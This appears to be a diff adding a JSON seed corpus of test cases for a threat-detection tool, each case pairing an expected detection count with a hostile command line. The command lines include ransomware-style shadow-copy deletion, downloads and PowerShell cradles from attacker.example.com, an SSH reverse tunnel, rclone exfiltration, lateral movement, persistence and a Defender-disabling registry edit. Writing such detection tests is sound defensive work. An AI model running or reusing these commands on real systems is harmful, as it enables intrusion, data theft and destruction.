@@ -1,0 +1,256 @@
+{
+  "name": "NivXRay seed corpus · P0.9",
+  "description": "Representative payloads exercising every provenance kind. Covers benign, remote-access, ransomware impact, defense-evasion, exfil, discovery, LOLBAS, and PowerShell paths.",
+  "cases": [
+    {
+      "id":       "benign_text",
+      "family":   "benign",
+      "expected": {"behaviors_min": 0, "recs_max": 0},
+      "payload":  "Hello, this is a plain text file describing our lunch menu.\nThere is no code here.\n"
+    },
+    {
+      "id":       "ransomware_shadow_wbadmin_bcdedit",
+      "family":   "impact",
+      "expected": {"behaviors_min": 3, "recs_min": 2},
+      "payload":  "cmd /c vssadmin delete shadows /all /quiet\r\ncmd /c wbadmin delete catalog -quiet\r\ncmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures\r\n"
+    },
+    {
+      "id":       "certutil_urlcache_download",
+      "family":   "ingress",
+      "expected": {"behaviors_min": 1},
+      "payload":  "powershell -c \"certutil.exe -urlcache -split -f http://attacker.example.com/edge.zip C:\\Users\\Public\\edge.zip\""
+    },
+    {
+      "id":       "wmic_uninstall_duo",
+      "family":   "defense_evasion",
+      "expected": {"behaviors_min": 1},
+      "payload":  "cmd /c wmic product where name=\"Duo Authentication for Windows\" call uninstall\r\n"
+    },
+    {
+      "id":       "openssh_reverse_tunnel",
+      "family":   "c2",
+      "expected": {"behaviors_min": 1},
+      "payload":  "C:\\Windows\\System32\\OpenSSH\\ssh.exe -R :12840 -N attacker@1.2.3.4 -p 443\r\n"
+    },
+    {
+      "id":       "rclone_exfil",
+      "family":   "exfiltration",
+      "expected": {"behaviors_min": 1},
+      "payload":  "wininit.exe copy --max-age 1y --exclude *{psd,7z,mox,pst,iso,exe} C:\\Data remote:bucket/\r\n"
+    },
+    {
+      "id":       "psexec_lateral",
+      "family":   "lateral_movement",
+      "expected": {"behaviors_min": 1},
+      "payload":  "PsExec.exe \\\\WORKSTATION-01 -u DOMAIN\\admin -p SecretPass cmd /c whoami\r\n"
+    },
+    {
+      "id":       "impacket_atexec",
+      "family":   "lateral_movement",
+      "expected": {"behaviors_min": 1},
+      "payload":  "python3 atexec.py DOMAIN/admin:pass@target 'whoami'\r\n"
+    },
+    {
+      "id":       "discovery_nltest_quser_ipconfig",
+      "family":   "discovery",
+      "expected": {"behaviors_min": 2},
+      "payload":  "nltest /dclist:DOMAIN\r\nquser /server:WS-01\r\nipconfig /all\r\nwhoami /priv\r\n"
+    },
+    {
+      "id":       "powershell_encodedcommand_downloadcradle",
+      "family":   "execution",
+      "expected": {"behaviors_min": 1},
+      "encoding": "base64",
+      "payload":  "cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRW5jb2RlZENvbW1hbmQgU1FCRkFGZ0FLQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVRnQmxBSFFBTGdCWEFHVUFZZ0JEQUd3QWFRQmxBRzRBZEFBcEFDNEFSQUJ2QUhjQWJnQnNBRzhBWVFCa0FGTUFkQUJ5QUdrQWJnQm5BQ2dBSndCb0FIUUFkQUJ3QURvQUx3QXZBR0VBZEFCMEFHRUFZd0JyQUdVQWNnQXVBR1VBZUFCaEFHMEFjQUJzQUdVQUxnQnVBR1VBZEFBdkFHSUFaUUJoQUdNQWJ3QnVBQzRBY0FCekFERUFKd0FwQUE9PQ=="
+    },
+    {
+      "id":       "medusa_ransomware_family_reference",
+      "family":   "impact",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "note":     "Structured malware_families entry — usually surfaced by report extractor, injected here directly.",
+      "structured": {
+        "malware_families": [{"name": "Medusa"}]
+      }
+    },
+    {
+      "id":       "anydesk_screenconnect_simplehelp_remote_access",
+      "family":   "c2",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "structured": {
+        "malware_families": [
+          {"name": "AnyDesk"},
+          {"name": "ScreenConnect"},
+          {"name": "SimpleHelp"},
+          {"name": "Quick Assist"}
+        ]
+      }
+    },
+    {
+      "id":       "cve_2024_57727_simplehelp_traversal",
+      "family":   "initial_access",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "cve_reference",
+      "structured": {
+        "cves": [{"id": "CVE-2024-57727"}]
+      }
+    },
+    {
+      "id":       "mimikatz_credential_dumping",
+      "family":   "credential_access",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "structured": {
+        "malware_families": [{"name": "Mimikatz"}]
+      }
+    },
+    {
+      "id":       "sharphound_ad_recon",
+      "family":   "discovery",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "structured": {
+        "malware_families": [{"name": "SharpHound"}, {"name": "BloodHound"}]
+      }
+    },
+    {
+      "id":       "rclone_named_exfil_tool",
+      "family":   "exfiltration",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "structured": {
+        "malware_families": [{"name": "Rclone"}, {"name": "MegaSync"}]
+      }
+    },
+    {
+      "id":       "mshta_hta_execution",
+      "family":   "execution",
+      "source":   "real_world (Volexity · initial-access reports)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "cmd /c mshta.exe http://cdn.malicious-domain[.]tld/payload.hta\r\n"
+    },
+    {
+      "id":       "rundll32_shell32_control_run_dll",
+      "family":   "execution",
+      "source":   "real_world (Microsoft · Threat Intel report on RATs)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "rundll32.exe C:\\Users\\Public\\loader.dll,EntryPoint\r\n"
+    },
+    {
+      "id":       "regsvr32_squiblydoo_scrobj",
+      "family":   "execution",
+      "source":   "real_world (Talos · Squiblydoo technique)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "regsvr32.exe /s /n /u /i:http://cdn.malicious-domain[.]tld/script.sct scrobj.dll\r\n"
+    },
+    {
+      "id":       "msiexec_remote_msi_install",
+      "family":   "execution",
+      "source":   "real_world (CISA · common installer proxy)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "msiexec.exe /i http://attacker.example.com/pkg.msi /quiet /qn\r\n"
+    },
+    {
+      "id":       "bitsadmin_transfer_stager",
+      "family":   "ingress",
+      "source":   "real_world (Microsoft · BITS abuse write-up)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "bitsadmin.exe /transfer bkgdjob /priority high http://attacker.example.com/loader.exe C:\\Users\\Public\\loader.exe\r\n"
+    },
+    {
+      "id":       "curl_ingress_tool_transfer",
+      "family":   "ingress",
+      "source":   "real_world (Unit42 · SocGholish delivery)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "curl.exe -k -o C:\\Users\\Public\\stage2.bin https://attacker.example.com/stage2.bin\r\n"
+    },
+    {
+      "id":       "powershell_download_execute_cradle",
+      "family":   "execution",
+      "source":   "real_world (Volexity · PowerShell cradle pattern)",
+      "expected": {"behaviors_min": 2},
+      "payload":  "powershell -nop -w hidden -c \"(New-Object Net.WebClient).DownloadString('http://attacker.example.com/a.ps1')\"\r\n"
+    },
+    {
+      "id":       "powershell_iex_in_memory",
+      "family":   "execution",
+      "source":   "real_world (Talos · fileless loader chain)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.example.com/loader.ps1')\"\r\n"
+    },
+    {
+      "id":       "schtasks_persistence_daily",
+      "family":   "persistence",
+      "source":   "real_world (CISA · MedusaLocker advisory)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "schtasks.exe /create /f /sc daily /tn WindowsUpdater /tr \"C:\\Users\\Public\\loader.exe\" /st 09:00\r\n"
+    },
+    {
+      "id":       "registry_run_key_persistence",
+      "family":   "persistence",
+      "source":   "real_world (Microsoft · common HKCU Run persistence)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Users\\Public\\loader.exe\" /f\r\n"
+    },
+    {
+      "id":       "registry_disable_defender_realtime",
+      "family":   "defense_evasion",
+      "source":   "real_world (Talos · Defender-disable via reg)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f\r\n"
+    },
+    {
+      "id":       "discovery_account_group_enum",
+      "family":   "discovery",
+      "source":   "real_world (Unit42 · hands-on-keyboard recon)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "net.exe user\r\nnet.exe localgroup administrators\r\nnet.exe group \"Domain Admins\" /domain\r\n"
+    },
+    {
+      "id":       "discovery_system_owner_whoami_quser",
+      "family":   "discovery",
+      "source":   "real_world (Volexity · recon chain)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "whoami.exe /all\r\nquser.exe\r\n"
+    },
+    {
+      "id":       "discovery_host_and_network",
+      "family":   "discovery",
+      "source":   "real_world (Talos · standard recon commands)",
+      "expected": {"behaviors_min": 2},
+      "payload":  "hostname.exe\r\nipconfig.exe /all\r\n"
+    },
+    {
+      "id":       "tar_extract_python_stager",
+      "family":   "execution",
+      "source":   "real_world (SquidLoader · tar-based staging)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "tar -xf C:\\Users\\Public\\python.zip -C C:\\Users\\Public\\python\r\n"
+    },
+    {
+      "id":       "msedge_headless_extension_edgecution",
+      "family":   "execution",
+      "source":   "real_world (Volexity · Edgecution browser-extension abuse)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "msedge.exe --headless --load-extension=\"C:\\Users\\Public\\ext\" --no-sandbox --disable-gpu about:blank\r\n"
+    },
+    {
+      "id":       "self_deletion_stager",
+      "family":   "defense_evasion",
+      "source":   "real_world (Microsoft · common anti-forensics tail)",
+      "expected": {"behaviors_min": 1},
+      "payload":  "cmd /c timeout /t 3 & del /f /q \"%~f0\" & exit /b 0\r\n"
+    },
+    {
+      "id":       "lazagne_credential_dumping_reference",
+      "family":   "credential_access",
+      "source":   "real_world (CISA · LaZagne toolkit reference)",
+      "expected": {"behaviors_min": 1},
+      "provenance_target": "malware_reference",
+      "structured": {
+        "malware_families": [{"name": "LaZagne"}]
+      }
+    }
+  ]
+}
